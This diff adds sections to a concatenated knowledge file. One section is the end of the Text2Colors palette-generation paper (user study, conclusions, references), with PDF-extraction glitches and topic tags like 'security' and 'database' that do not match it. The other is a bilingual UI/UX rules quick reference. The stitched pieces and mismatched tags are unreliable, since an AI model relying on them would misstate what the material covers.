+39.6%, our TPN has the FR of 56.2% while maintaining a high level of diversity
+and multimodality. The FR of 56.2% indicates that the generated palettesare
+indistinguishable to human eyes and sometimes even match the inputtext bet-
+ter than the ground truth palettes. Note that the standard deviation of 12.7%
+implies diverse responses to the same data pairs.
+Part II: Colorization ComparisonsIn this part of the user study, we con-
+duct a survey on the performance of the PCN given palette inputs. Users are
+asked to answer five questions based on the given grayscale image, the color
+palette, and the colored image. For quantitative comparison, we set a state-of-
+the-art colorization model [44] as our baseline. This model originally contains
+local and global hint networks. In our implementation of the baseline model,
+we utilize the global hint networks to infuse our generated palette tothe main
+colorization networks. Note that we modified the baseline model to fit ourtask.
+Our novelty is the ability to produce high-quality colorization with only five col-
+ors of a palette while our baseline [44] needs 313 bins ofabgamut. Our model
+is able to colorize with limited information due to novel components such as the
+conditional adversarial loss and feeding the palette into skip-connection layers.
+Study  Procedure.We show colorization results of our PCN and the baseline
+model one-by-one in a random order. Then, we ask each participant to answer
+
+14Hyojin Bahng and Seungjoo Yoo and Wonwoong Cho
+Fig. 10.We compare colorization results with previous work [44]. The five-color palette
+used for colorization is shown next to the input grayscale image. Note that our PCN
+performs better at applying various colors included in the palette.
+five different questions (shown in Fig. 9) based on a five-point Likert scale. The
+focus of our questions is to evaluate how well the palette was used in colorizing
+the given grayscale image. The total number of data samples per test is 15.
+Results.The resulting statistics are reported in Fig. 9. Our PCN achieves higher
+scores than the baseline model across all the questions. We can infer that the
+palettes generated by our model are preferred over palettes createdby a human
+hand. Since our model learns consistent patterns from a large number ofhuman-
+generated palette-text pairs, our model may have generated color palettes that
+more users could relate to.
+## 6  Conclusions
+We proposed a generative model that can produce multiple palettes from rich
+text input and colorize grayscale images using the generated palettes.Evalua-
+tion results confirm that our TPN can generate plausible color palettes from
+text input and can incorporate the multimodal nature of colors. Qualitative re-
+sults on our PCN also show that the diverse colors in a palette are effectively
+reflected in the colorization results. Future work includes extending our model
+to a broader range of tasks requiring color recommendation and conductingthe
+detailed analysis of our dataset.
+Acknowledgement.This work was partially supported by the National Re-
+search Foundation of Korea (NRF) grant funded by the Korean government
+(MSIP) (No. NRF2016R1C1B2015924). Jaegul Choo is the corresponding au-
+thor.
+
+Text2Colors15
+## References
+-  Ahn, H., Ha, T., Choi, Y., Yoo, H., Oh, S.: Text2Action: Generative adversarial
+synthesis from language to action. In: Proc. the IEEE International Conference on
+Robotics and Automation (ICRA) (2018)
+-  Bahdanau, D., Cho, K., Bengio, Y.: Neural machine translation by jointly learning
+to align and translate. In: Proc. the International Conference onLearning Repre-
+sentations (ICLR) (2014)
+-  Chang,  H.,  Fried,  O.,  Liu,  Y.,  DiVerdi,  S.,  Finkelstein,  A.:Palette-based  photo
+recoloring. ACM Transactions on Graphics (TOG)34(4) (2015)
+-  Charpiat, G., Hofmann, M., Sch ̈olkopf, B.: Automatic imagecolorization via mul-
+timodal  predictions.  In:  Proc.  the  European  Conference  on  Computer  Vision
+## (ECCV) (2008)
+-  Cho, J., Yun, S., Lee, K., Choi, J.Y.: PaletteNet: Image recolorization with given
+color  palette.  In:  Proc.  the  IEEE  Conference  on  Computer  Visionand  Pattern
+## Recognition Workshops (2017)
+-  Cho, K., Van Merri ̈enboer, B., Gulcehre, C., Bahdanau, D., Bougares, F., Schwenk,
+H.,  Bengio,  Y.:  Learning  phrase  representations  using  RNN  encoder-decoder  for
+statistical machine translation. In: Conference on Empirical Methods in Natural
+Language Processing (EMNLP) (2014)
+-  Choi,  Y.,  Choi,  M.,  Kim,  M.,  Ha,  J.W.,  Kim,  S.,  Choo,  J.:  StarGAN:  Unified
+generative adversarial networks for multi-domain image-to-image translation. In:
+Proc. the IEEE Conference on Computer Vision and Pattern Recognition (CVPR)
+## (2017)
+-  Chuang,  J.,  Stone,  M.,  Hanrahan,  P.:  A  probabilistic  model  of  the  categorical
+association  between  colors.  In:  Proc.  the  IS&T  Color  and  Imaging  Conference
+(CIC). vol. 2008 (2008)
+-  Crozier, W.: The psychology of colour preferences. Coloration Technology26(1)
+## (1996)
+-  De  Bortoli,  M.,  Maroto,  J.:  Colours  across  cultures:  Translating  colours  in  in-
+teractive marketing communications. In: Proc. the European Languages and the
+Implementation of Communication and Information Technologies (ELICIT) (2001)
+-  Guadarrama, S., Dahl, R., Bieber, D., Norouzi, M., Shlens, J., Murphy, K.: Pix-
+color: Pixel recursive colorization. In: Proc. the British Machine Vision Conference
+## (BMVC) (2017)
+-  Heer,  J.,  Stone,  M.:  Color  naming  models  for  color  selection,  image  editing  and
+palette design. In: Proc. the SIGCHI Conference on Human Factorsin Computing
+Systems (SIGCHI) (2012)
+-  Isola, P., Zhu, J.Y., Zhou, T., Efros, A.A.: Image-to-image translation with con-
+ditional adversarial networks. In: Proc. the IEEE Conference on Computer Vision
+and Pattern Recognition (CVPR) (2017)
+-  Jahanian, A., Keshvari, S.,  Vishwanathan, S.,  Allebach,J.P.: Colors–messengers
+of concepts: Visual design mining for learning color semantics. ACM Transactions
+on Computer-Human Interaction (TOCHI)24(1) (2017)
+-  Kawakami, K., Dyer, C., Routledge, B.R., Smith, N.A.: Character sequence models
+for  colorful  words.  In:  Proc.  the  Conference  on  Empirical  Methods  in  Natural
+Language Processing (EMNLP) (2016)
+-  Kim, T., Cha, M., Kim, H., Lee, J., Kim, J.: Learning to discover cross-domain re-
+lations with generative adversarial networks. In: Proc. the International Conference
+on Machine Learning (ICML) (2017)
+
+16Hyojin Bahng and Seungjoo Yoo and Wonwoong Cho
+-  Kingma, D.P., Ba, J.: Adam: A method for stochastic optimization. In: Proc. the
+International Conference on Learning Representations (ICLR) (2014)
+-  Kobayashi, S.: Color image scale. http://www.ncd-ri.co.jp/english/main
+## 0104.html
+## (2009)
+-  Labrecque, L.I., Milne, G.R.: Exciting red and competent blue: the importance of
+color in marketing. Journal of the Academy of Marketing Science40(5) (2012)
+-  Li,  X.,  Zhao,  H.,  Nie,  G.,  Huang,  H.:  Image  recoloring  usinggeodesic  distance
+based color harmonization. Computational Visual Media1(2) (2015)
+-  Liu, Y., Cohen, M., Uyttendaele, M., Rusinkiewicz, S.: Autostyle: Automatic style
+transfer from image collections to users’ images. Computer Graphics Forum (CGF)
+## 33(4) (2014)
+-  Luong, M.T., Pham, H., Manning, C.D.: Effective approachesto attention-based
+neural  machine  translation.  In:  Proc.  the  Conference  on  EmpiricalMethods  in
+Natural Language Processing (EMNLP) (2015)
+-  McMahan, B., Stone, M.: A bayesian model of grounded colorsemantics. Transac-
+tions of the Association of Computational Linguistics (TACL)3(1) (2015)
+-  Mirza,  M.,  Osindero,  S.:  Conditional  generative  adversarialnets.  arXiv  preprint
+arXiv:1411.1784 (2014)
+-  Monroe, W., Hawkins, R.X., Goodman, N.D., Potts, C.: Colorsin context: A prag-
+matic neural model for grounded language understanding. Transactions of the As-
+sociation of Computational Linguistics (ACL) (2017)
+-  Munroe,R.:Colorsurveyresults.Onlineat
+http://blog.xkcd.com/2010/05/03/color-surveyresults (2010)
+-  Murray, N., Skaff, S., Marchesotti, L., Perronnin, F.: Toward automatic and flexible
+concept transfer. Computers & Graphics36(6) (2012)
+-  Pathak,  D.,  Krahenbuhl,  P.,  Donahue,  J.,  Darrell,  T.,  Efros,  A.A.:  Context  en-
+coders: Feature learning by inpainting. In: Proc. the IEEE Conference on Computer
+Vision and Pattern Recognition (CVPR) (2016)
+-  Pennington,  J.,  Socher,  R.,  Manning,  C.:  Glove:  Global  vectors  for  word  repre-
+sentation.  In:  Proc.  the  Conference  on  Empirical  Methods  in  Natural  Language
+Processing (EMNLP) (2014)
+-  Radford,  A.,  Metz,  L.,  Chintala,  S.:  Unsupervised  representation  learning  with
+deep  convolutional  generative  adversarial  networks.  In:  Proc.  the  International
+Conference on Learning Representations (ICLR) (2015)
+-  Reed,  S.,  Akata,  Z.,  Lee,  H.,  Schiele,  B.:  Learning  deep  representations  of  fine-
+grained  visual  descriptions.  In:  Proc.  the  IEEE  Conference  on  Computer  Vision
+and Pattern Recognition (CVPR) (2016)
+-  Reed, S., Akata, Z., Yan, X., Logeswaran, L., Schiele, B.,Lee, H.: Generative adver-
+sarial text to image synthesis. In: Proc. the International Conference on Machine
+Learning (ICML) (2016)
+-  Ronneberger, O., Fischer, P., Brox, T.: U-net: Convolutional networks for biomed-
+ical image segmentation. In: Proc. the International Conference on Medical Image
+Computing and Computer Assisted Intervention (MICCAI) (2015)
+-  Russakovsky,  O.,  Deng,  J.,  Su,  H.,  Krause,  J.,  Satheesh,  S.,  Ma,  S.,  Huang,  Z.,
+Karpathy, A., Khosla, A., Bernstein, M., et al.: Imagenet largescale visual recog-
+nition challenge. International Journal of Computer Vision (IJCV)115(3) (2015)
+-  Sharma, G., Wu, W., Dalal, E.N.: The CIEDE2000 color-difference formula: Imple-
+mentation notes, supplementary test data, and mathematicalobservations. Color
+## Research & Application30(1) (2005)
+-  Solli, M., Lenz, R.: Color semantics for image indexing. In: Proc. the Conference
+on Colour in Graphics Imaging and Vision (CGIV) (2010)
+
+Text2Colors17
+-  Sutskever,  I.,  Martens,  J.,  Hinton,  G.E.:  Generating  text  with  recurrent  neural
+networks.  In:  Proc.  the  International  Conference  on  Machine  Learning  (ICML)
+## (2011)
+-  Sutskever,  I.,  Vinyals,  O.,  Le,  Q.V.:  Sequence  to  sequence  learning  with  neural
+networks. In: Advances in Neural Information Processing Systems(NIPS) (2014)
+-  Tang, D., Qin, B., Liu, T.: Document modeling with gated recurrent neural network
+for  sentiment  classification.  In:  Proc.  the  Conference  on  Empirical  Methods  in
+Natural Language Processing (EMNLP) (2015)
+-  Vaswani, A., Shazeer, N., Parmar, N., Uszkoreit, J., Jones, L., Gomez, A.N., Kaiser,
+L., Polosukhin, I.: Attention is all you need. In: Advancesin Neural Information
+Processing Systems (NIPS) (2017)
+-  Wah, C., Branson, S., Welinder, P., Perona, P., Belongie, S.: The Caltech-UCSD
+Birds-200-2011  Dataset.  Tech.  Rep.  CNS-TR-2011-001,  California  Institute  of
+## Technology (2011)
+-  Xiao,  Y.,  Zhou,  P.,  Zheng,  Y.:  Interactive  deep  colorization  with  simultaneous
+global and local inputs. arXiv preprint arXiv:1801.09083 (2018)
+-  Zhang, H., Xu, T., Li, H., Zhang, S., Huang, X., Wang, X., Metaxas, D.: Stack-
+GAN: Text to photo-realistic image synthesis with stacked generative adversarial
+networks. In: Proc. the IEEE International Conference on Computer Vision (ICCV)
+## (2017)
+-  Zhang,  R.,  Zhu,  J.Y.,  Isola,  P.,  Geng,  X.,  Lin,  A.S.,  Yu,  T.,  Efros,  A.A.:  Real-
+time user-guided image colorization with learned deep priors. ACM Transactions
+on Graphics (TOG) (2017)
+
+---
+> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, performance, tdd]
 
 ### 📘 KNOWLEDGE: NEXUS_LANGUAGE-MODEL.MD
 
@@ -19686,6 +33953,834 @@ import 'webauthn-polyfills';
 ---
 > **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, tdd, api]
 
+### 📘 KNOWLEDGE: NEXUS_QUICK-REFERENCE.MD
+
+> **VERSION**: v1 | **Last Updated**: 26/05/2026
+
+## When to Apply
+
+当任务涉及 **UI 结构、视觉设计决策、交互模式或用户体验质量控制** 时，应使用此 Skill。
+
+### Must Use
+
+在以下情况必须调用此 Skill：
+
+- 设计新的页面（Landing Page、Dashboard、Admin、SaaS、Mobile App）
+- 创建或重构 UI 组件（按钮、弹窗、表单、表格、图表等）
+- 选择配色方案、字体系统、间距规范或布局体系
+- 审查 UI 代码的用户体验、可访问性或视觉一致性
+- 实现导航结构、动效或响应式行为
+- 做产品层级的设计决策（风格、信息层级、品牌表达）
+- 提升界面的感知质量、清晰度或可用性
+
+### Recommended
+
+在以下情况建议使用此 Skill：
+
+- UI 看起来"不够专业"，但原因不明确
+- 收到可用性或体验方面的反馈
+- 准备上线前的 UI 质量优化
+- 需要对齐跨平台设计（Web / iOS / Android）
+- 构建设计系统或可复用组件库
+
+### Skip
+
+在以下情况无需使用此 Skill：
+
+- 纯后端逻辑开发
+- 仅涉及 API 或数据库设计
+- 与界面无关的性能优化
+- 基础设施或 DevOps 工作
+- 非视觉类脚本或自动化任务
+
+**判断准则**：如果任务会改变某个功能 **看起来如何、使用起来如何、如何运动或如何被交互**，就应该使用此 Skill。
+
+## Rule Categories by Priority
+
+*供人工/AI 查阅：按 1→10 决定先关注哪类规则；需要细则时用 `--domain <Domain>` 查询。脚本不读取本表。*
+
+| Priority | Category | Impact | Domain | Key Checks (Must Have) | Anti-Patterns (Avoid) |
+|----------|----------|--------|--------|------------------------|------------------------|
+| 1 | Accessibility | CRITICAL | `ux` | Contrast 4.5:1, Alt text, Keyboard nav, Aria-labels | Removing focus rings, Icon-only buttons without labels |
+| 2 | Touch & Interaction | CRITICAL | `ux` | Min size 44×44px, 8px+ spacing, Loading feedback | Reliance on hover only, Instant state changes (0ms) |
+| 3 | Performance | HIGH | `ux` | WebP/AVIF, Lazy loading, Reserve space (CLS &lt; 0.1) | Layout thrashing, Cumulative Layout Shift |
+| 4 | Style Selection | HIGH | `style`, `product` | Match product type, Consistency, SVG icons (no emoji) | Mixing flat & skeuomorphic randomly, Emoji as icons |
+| 5 | Layout & Responsive | HIGH | `ux` | Mobile-first breakpoints, Viewport meta, No horizontal scroll | Horizontal scroll, Fixed px container widths, Disable zoom |
+| 6 | Typography & Color | MEDIUM | `typography`, `color` | Base 16px, Line-height 1.5, Semantic color tokens | Text &lt; 12px body, Gray-on-gray, Raw hex in components |
+| 7 | Animation | MEDIUM | `ux` | Duration 150–300ms, Motion conveys meaning, Spatial continuity | Decorative-only animation, Animating width/height, No reduced-motion |
+| 8 | Forms & Feedback | MEDIUM | `ux` | Visible labels, Error near field, Helper text, Progressive disclosure | Placeholder-only label, Errors only at top, Overwhelm upfront |
+| 9 | Navigation Patterns | HIGH | `ux` | Predictable back, Bottom nav ≤5, Deep linking | Overloaded nav, Broken back behavior, No deep links |
+| 10 | Charts & Data | LOW | `chart` | Legends, Tooltips, Accessible colors | Relying on color alone to convey meaning |
+
+## Quick Reference
+
+### 1. Accessibility (CRITICAL)
+
+- `color-contrast` - Minimum 4.5:1 ratio for normal text (large text 3:1); Material Design
+- `focus-states` - Visible focus rings on interactive elements (2–4px; Apple HIG, MD)
+- `alt-text` - Descriptive alt text for meaningful images
+- `aria-labels` - aria-label for icon-only buttons; accessibilityLabel in native (Apple HIG)
+- `keyboard-nav` - Tab order matches visual order; full keyboard support (Apple HIG)
+- `form-labels` - Use label with for attribute
+- `skip-links` - Skip to main content for keyboard users
+- `heading-hierarchy` - Sequential h1→h6, no level skip
+- `color-not-only` - Don't convey info by color alone (add icon/text)
+- `dynamic-type` - Support system text scaling; avoid truncation as text grows (Apple Dynamic Type, MD)
+- `reduced-motion` - Respect prefers-reduced-motion; reduce/disable animations when requested (Apple Reduced Motion API, MD)
+- `voiceover-sr` - Meaningful accessibilityLabel/accessibilityHint; logical reading order for VoiceOver/screen readers (Apple HIG, MD)
+- `escape-routes` - Provide cancel/back in modals and multi-step flows (Apple HIG)
+- `keyboard-shortcuts` - Preserve system and a11y shortcuts; offer keyboard alternatives for drag-and-drop (Apple HIG)
+
+### 2. Touch & Interaction (CRITICAL)
+
+- `touch-target-size` - Min 44×44pt (Apple) / 48×48dp (Material); extend hit area beyond visual bounds if needed
+- `touch-spacing` - Minimum 8px/8dp gap between touch targets (Apple HIG, MD)
+- `hover-vs-tap` - Use click/tap for primary interactions; don't rely on hover alone
+- `loading-buttons` - Disable button during async operations; show spinner or progress
+- `error-feedback` - Clear error messages near problem
+- `cursor-pointer` - Add cursor-pointer to clickable elements (Web)
+- `gesture-conflicts` - Avoid horizontal swipe on main content; prefer vertical scroll
+- `tap-delay` - Use touch-action: manipulation to reduce 300ms delay (Web)
+- `standard-gestures` - Use platform standard gestures consistently; don't redefine (e.g. swipe-back, pinch-zoom) (Apple HIG)
+- `system-gestures` - Don't block system gestures (Control Center, back swipe, etc.) (Apple HIG)
+- `press-feedback` - Visual feedback on press (ripple/highlight; MD state layers)
+- `haptic-feedback` - Use haptic for confirmations and important actions; avoid overuse (Apple HIG)
+- `gesture-alternative` - Don't rely on gesture-only interactions; always provide visible controls for critical actions
+- `safe-area-awareness` - Keep primary touch targets away from notch, Dynamic Island, gesture bar and screen edges
+- `no-precision-required` - Avoid requiring pixel-perfect taps on small icons or thin edges
+- `swipe-clarity` - Swipe actions must show clear affordance or hint (chevron, label, tutorial)
+- `drag-threshold` - Use a movement threshold before starting drag to avoid accidental drags
+
+### 3. Performance (HIGH)
+
+- `image-optimization` - Use WebP/AVIF, responsive images (srcset/sizes), lazy load non-critical assets
+- `image-dimension` - Declare width/height or use aspect-ratio to prevent layout shift (Core Web Vitals: CLS)
+- `font-loading` - Use font-display: swap/optional to avoid invisible text (FOIT); reserve space to reduce layout shift (MD)
+- `font-preload` - Preload only critical fonts; avoid overusing preload on every variant
+- `critical-css` - Prioritize above-the-fold CSS (inline critical CSS or early-loaded stylesheet)
+- `lazy-loading` - Lazy load non-hero components via dynamic import / route-level splitting
+- `bundle-splitting` - Split code by route/feature (React Suspense / Next.js dynamic) to reduce initial load and TTI
+- `third-party-scripts` - Load third-party scripts async/defer; audit and remove unnecessary ones (MD)
+- `reduce-reflows` - Avoid frequent layout reads/writes; batch DOM reads then writes
+- `content-jumping` - Reserve space for async content to avoid layout jumps (Core Web Vitals: CLS)
+- `lazy-load-below-fold` - Use loading="lazy" for below-the-fold images and heavy media
+- `virtualize-lists` - Virtualize lists with 50+ items to improve memory efficiency and scroll performance
+- `main-thread-budget` - Keep per-frame work under ~16ms for 60fps; move heavy tasks off main thread (HIG, MD)
+- `progressive-loading` - Use skeleton screens / shimmer instead of long blocking spinners for >1s operations (Apple HIG)
+- `input-latency` - Keep input latency under ~100ms for taps/scrolls (Material responsiveness standard)
+- `tap-feedback-speed` - Provide visual feedback within 100ms of tap (Apple HIG)
+- `debounce-throttle` - Use debounce/throttle for high-frequency events (scroll, resize, input)
+- `offline-support` - Provide offline state messaging and basic fallback (PWA / mobile)
+- `network-fallback` - Offer degraded modes for slow networks (lower-res images, fewer animations)
+
+### 4. Style Selection (HIGH)
+
+- `style-match` - Match style to product type (use `--design-system` for recommendations)
+- `consistency` - Use same style across all pages
+- `no-emoji-icons` - Use SVG icons (Heroicons, Lucide), not emojis
+- `color-palette-from-product` - Choose palette from product/industry (search `--domain color`)
+- `effects-match-style` - Shadows, blur, radius aligned with chosen style (glass / flat / clay etc.)
+- `platform-adaptive` - Respect platform idioms (iOS HIG vs Material): navigation, controls, typography, motion
+- `state-clarity` - Make hover/pressed/disabled states visually distinct while staying on-style (Material state layers)
+- `elevation-consistent` - Use a consistent elevation/shadow scale for cards, sheets, modals; avoid random shadow values
+- `dark-mode-pairing` - Design light/dark variants together to keep brand, contrast, and style consistent
+- `icon-style-consistent` - Use one icon set/visual language (stroke width, corner radius) across the product
+- `system-controls` - Prefer native/system controls over fully custom ones; only customize when branding requires it (Apple HIG)
+- `blur-purpose` - Use blur to indicate background dismissal (modals, sheets), not as decoration (Apple HIG)
+- `primary-action` - Each screen should have only one primary CTA; secondary actions visually subordinate (Apple HIG)
+
+### 5. Layout & Responsive (HIGH)
+
+- `viewport-meta` - width=device-width initial-scale=1 (never disable zoom)
+- `mobile-first` - Design mobile-first, then scale up to tablet and desktop
+- `breakpoint-consistency` - Use systematic breakpoints (e.g. 375 / 768 / 1024 / 1440)
+- `readable-font-size` - Minimum 16px body text on mobile (avoids iOS auto-zoom)
+- `line-length-control` - Mobile 35–60 chars per line; desktop 60–75 chars
+- `horizontal-scroll` - No horizontal scroll on mobile; ensure content fits viewport width
+- `spacing-scale` - Use 4pt/8dp incremental spacing system (Material Design)
+- `touch-density` - Keep component spacing comfortable for touch: not cramped, not causing mis-taps
+- `container-width` - Consistent max-width on desktop (max-w-6xl / 7xl)
+- `z-index-management` - Define layered z-index scale (e.g. 0 / 10 / 20 / 40 / 100 / 1000)
+- `fixed-element-offset` - Fixed navbar/bottom bar must reserve safe padding for underlying content
+- `scroll-behavior` - Avoid nested scroll regions that interfere with the main scroll experience
+- `viewport-units` - Prefer min-h-dvh over 100vh on mobile
+- `orientation-support` - Keep layout readable and operable in landscape mode
+- `content-priority` - Show core content first on mobile; fold or hide secondary content
+- `visual-hierarchy` - Establish hierarchy via size, spacing, contrast — not color alone
+
+### 6. Typography & Color (MEDIUM)
+
+- `line-height` - Use 1.5-1.75 for body text
+- `line-length` - Limit to 65-75 characters per line
+- `font-pairing` - Match heading/body font personalities
+- `font-scale` - Consistent type scale (e.g. 12 14 16 18 24 32)
+- `contrast-readability` - Darker text on light backgrounds (e.g. slate-900 on white)
+- `text-styles-system` - Use platform type system: iOS 11 Dynamic Type styles / Material 5 type roles (display, headline, title, body, label) (HIG, MD)
+- `weight-hierarchy` - Use font-weight to reinforce hierarchy: Bold headings (600–700), Regular body (400), Medium labels (500) (MD)
+- `color-semantic` - Define semantic color tokens (primary, secondary, error, surface, on-surface) not raw hex in components (Material color system)
+- `color-dark-mode` - Dark mode uses desaturated / lighter tonal variants, not inverted colors; test contrast separately (HIG, MD)
+- `color-accessible-pairs` - Foreground/background pairs must meet 4.5:1 (AA) or 7:1 (AAA); use tools to verify (WCAG, MD)
+- `color-not-decorative-only` - Functional color (error red, success green) must include icon/text; avoid color-only meaning (HIG, MD)
+- `truncation-strategy` - Prefer wrapping over truncation; when truncating use ellipsis and provide full text via tooltip/expand (Apple HIG)
+- `letter-spacing` - Respect default letter-spacing per platform; avoid tight tracking on body text (HIG, MD)
+- `number-tabular` - Use tabular/monospaced figures for data columns, prices, and timers to prevent layout shift
+- `whitespace-balance` - Use whitespace intentionally to group related items and separate sections; avoid visual clutter (Apple HIG)
+
+### 7. Animation (MEDIUM)
+
+- `duration-timing` - Use 150–300ms for micro-interactions; complex transitions ≤400ms; avoid >500ms (MD)
+- `transform-performance` - Use transform/opacity only; avoid animating width/height/top/left
+- `loading-states` - Show skeleton or progress indicator when loading exceeds 300ms
+- `excessive-motion` - Animate 1-2 key elements per view max
+- `easing` - Use ease-out for entering, ease-in for exiting; avoid linear for UI transitions
+- `motion-meaning` - Every animation must express a cause-effect relationship, not just be decorative (Apple HIG)
+- `state-transition` - State changes (hover / active / expanded / collapsed / modal) should animate smoothly, not snap
+- `continuity` - Page/screen transitions should maintain spatial continuity (shared element, directional slide) (Apple HIG)
+- `parallax-subtle` - Use parallax sparingly; must respect reduced-motion and not cause disorientation (Apple HIG)
+- `spring-physics` - Prefer spring/physics-based curves over linear or cubic-bezier for natural feel (Apple HIG fluid animations)
+- `exit-faster-than-enter` - Exit animations shorter than enter (~60–70% of enter duration) to feel responsive (MD motion)
+- `stagger-sequence` - Stagger list/grid item entrance by 30–50ms per item; avoid all-at-once or too-slow reveals (MD)
+- `shared-element-transition` - Use shared element / hero transitions for visual continuity between screens (MD, HIG)
+- `interruptible` - Animations must be interruptible; user tap/gesture cancels in-progress animation immediately (Apple HIG)
+- `no-blocking-animation` - Never block user input during an animation; UI must stay interactive (Apple HIG)
+- `fade-crossfade` - Use crossfade for content replacement within the same container (MD)
+- `scale-feedback` - Subtle scale (0.95–1.05) on press for tappable cards/buttons; restore on release (HIG, MD)
+- `gesture-feedback` - Drag, swipe, and pinch must provide real-time visual response tracking the finger (MD Motion)
+- `hierarchy-motion` - Use translate/scale direction to express hierarchy: enter from below = deeper, exit upward = back (MD)
+- `motion-consistency` - Unify duration/easing tokens globally; all animations share the same rhythm and feel
+- `opacity-threshold` - Fading elements should not linger below opacity 0.2; either fade fully or remain visible
+- `modal-motion` - Modals/sheets should animate from their trigger source (scale+fade or slide-in) for spatial context (HIG, MD)
+- `navigation-direction` - Forward navigation animates left/up; backward animates right/down — keep direction logically consistent (HIG)
+- `layout-shift-avoid` - Animations must not cause layout reflow or CLS; use transform for position changes
+
+### 8. Forms & Feedback (MEDIUM)
+
+- `input-labels` - Visible label per input (not placeholder-only)
+- `error-placement` - Show error below the related field
+- `submit-feedback` - Loading then success/error state on submit
+- `required-indicators` - Mark required fields (e.g. asterisk)
+- `empty-states` - Helpful message and action when no content
+- `toast-dismiss` - Auto-dismiss toasts in 3-5s
+- `confirmation-dialogs` - Confirm before destructive actions
+- `input-helper-text` - Provide persistent helper text below complex inputs, not just placeholder (Material Design)
+- `disabled-states` - Disabled elements use reduced opacity (0.38–0.5) + cursor change + semantic attribute (MD)
+- `progressive-disclosure` - Reveal complex options progressively; don't overwhelm users upfront (Apple HIG)
+- `inline-validation` - Validate on blur (not keystroke); show error only after user finishes input (MD)
+- `input-type-keyboard` - Use semantic input types (email, tel, number) to trigger the correct mobile keyboard (HIG, MD)
+- `password-toggle` - Provide show/hide toggle for password fields (MD)
+- `autofill-support` - Use autocomplete / textContentType attributes so the system can autofill (HIG, MD)
+- `undo-support` - Allow undo for destructive or bulk actions (e.g. "Undo delete" toast) (Apple HIG)
+- `success-feedback` - Confirm completed actions with brief visual feedback (checkmark, toast, color flash) (MD)
+- `error-recovery` - Error messages must include a clear recovery path (retry, edit, help link) (HIG, MD)
+- `multi-step-progress` - Multi-step flows show step indicator or progress bar; allow back navigation (MD)
+- `form-autosave` - Long forms should auto-save drafts to prevent data loss on accidental dismissal (Apple HIG)
+- `sheet-dismiss-confirm` - Confirm before dismissing a sheet/modal with unsaved changes (Apple HIG)
+- `error-clarity` - Error messages must state cause + how to fix (not just "Invalid input") (HIG, MD)
+- `field-grouping` - Group related fields logically (fieldset/legend or visual grouping) (MD)
+- `read-only-distinction` - Read-only state should be visually and semantically different from disabled (MD)
+- `focus-management` - After submit error, auto-focus the first invalid field (WCAG, MD)
+- `error-summary` - For multiple errors, show summary at top with anchor links to each field (WCAG)
+- `touch-friendly-input` - Mobile input height ≥44px to meet touch target requirements (Apple HIG)
+- `destructive-emphasis` - Destructive actions use semantic danger color (red) and are visually separated from primary actions (HIG, MD)
+- `toast-accessibility` - Toasts must not steal focus; use aria-live="polite" for screen reader announcement (WCAG)
+- `aria-live-errors` - Form errors use aria-live region or role="alert" to notify screen readers (WCAG)
+- `contrast-feedback` - Error and success state colors must meet 4.5:1 contrast ratio (WCAG, MD)
+- `timeout-feedback` - Request timeout must show clear feedback with retry option (MD)
+
+### 9. Navigation Patterns (HIGH)
+
+- `bottom-nav-limit` - Bottom navigation max 5 items; use labels with icons (Material Design)
+- `drawer-usage` - Use drawer/sidebar for secondary navigation, not primary actions (Material Design)
+- `back-behavior` - Back navigation must be predictable and consistent; preserve scroll/state (Apple HIG, MD)
+- `deep-linking` - All key screens must be reachable via deep link / URL for sharing and notifications (Apple HIG, MD)
+- `tab-bar-ios` - iOS: use bottom Tab Bar for top-level navigation (Apple HIG)
+- `top-app-bar-android` - Android: use Top App Bar with navigation icon for primary structure (Material Design)
+- `nav-label-icon` - Navigation items must have both icon and text label; icon-only nav harms discoverability (MD)
+- `nav-state-active` - Current location must be visually highlighted (color, weight, indicator) in navigation (HIG, MD)
+- `nav-hierarchy` - Primary nav (tabs/bottom bar) vs secondary nav (drawer/settings) must be clearly separated (MD)
+- `modal-escape` - Modals and sheets must offer a clear close/dismiss affordance; swipe-down to dismiss on mobile (Apple HIG)
+- `search-accessible` - Search must be easily reachable (top bar or tab); provide recent/suggested queries (MD)
+- `breadcrumb-web` - Web: use breadcrumbs for 3+ level deep hierarchies to aid orientation (MD)
+- `state-preservation` - Navigating back must restore previous scroll position, filter state, and input (HIG, MD)
+- `gesture-nav-support` - Support system gesture navigation (iOS swipe-back, Android predictive back) without conflict (HIG, MD)
+- `tab-badge` - Use badges on nav items sparingly to indicate unread/pending; clear after user visits (HIG, MD)
+- `overflow-menu` - When actions exceed available space, use overflow/more menu instead of cramming (MD)
+- `bottom-nav-top-level` - Bottom nav is for top-level screens only; never nest sub-navigation inside it (MD)
+- `adaptive-navigation` - Large screens (≥1024px) prefer sidebar; small screens use bottom/top nav (Material Adaptive)
+- `back-stack-integrity` - Never silently reset the navigation stack or unexpectedly jump to home (HIG, MD)
+- `navigation-consistency` - Navigation placement must stay the same across all pages; don't change by page type
+- `avoid-mixed-patterns` - Don't mix Tab + Sidebar + Bottom Nav at the same hierarchy level
+- `modal-vs-navigation` - Modals must not be used for primary navigation flows; they break the user's path (HIG)
+- `focus-on-route-change` - After page transition, move focus to main content region for screen reader users (WCAG)
+- `persistent-nav` - Core navigation must remain reachable from deep pages; don't hide it entirely in sub-flows (HIG, MD)
+- `destructive-nav-separation` - Dangerous actions (delete account, logout) must be visually and spatially separated from normal nav items (HIG, MD)
+- `empty-nav-state` - When a nav destination is unavailable, explain why instead of silently hiding it (MD)
+
+### 10. Charts & Data (LOW)
+
+- `chart-type` - Match chart type to data type (trend → line, comparison → bar, proportion → pie/donut)
+- `color-guidance` - Use accessible color palettes; avoid red/green only pairs for colorblind users (WCAG, MD)
+- `data-table` - Provide table alternative for accessibility; charts alone are not screen-reader friendly (WCAG)
+- `pattern-texture` - Supplement color with patterns, textures, or shapes so data is distinguishable without color (WCAG, MD)
+- `legend-visible` - Always show legend; position near the chart, not detached below a scroll fold (MD)
+- `tooltip-on-interact` - Provide tooltips/data labels on hover (Web) or tap (mobile) showing exact values (HIG, MD)
+- `axis-labels` - Label axes with units and readable scale; avoid truncated or rotated labels on mobile
+- `responsive-chart` - Charts must reflow or simplify on small screens (e.g. horizontal bar instead of vertical, fewer ticks)
+- `empty-data-state` - Show meaningful empty state when no data exists ("No data yet" + guidance), not a blank chart (MD)
+- `loading-chart` - Use skeleton or shimmer placeholder while chart data loads; don't show an empty axis frame
+- `animation-optional` - Chart entrance animations must respect prefers-reduced-motion; data should be readable immediately (HIG)
